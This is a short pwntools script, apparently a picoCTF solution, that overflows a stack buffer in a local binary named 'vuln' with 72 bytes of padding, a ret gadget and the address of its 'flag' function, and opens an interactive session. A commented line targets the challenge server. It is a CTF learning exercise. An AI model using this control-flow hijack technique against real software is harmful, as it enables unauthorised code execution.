from pwn import *

elf = ELF('./vuln')
io = process(elf.path)
#io = remote('saturn.picoctf.net', 60659)
context.binary = elf

offset = 64 + 8
ret_addr = 0x40101a

payload = b'a' * offset
payload += p64(ret_addr)
payload += p64(elf.symbols['flag'])

io.sendline(payload)

io.interactive()
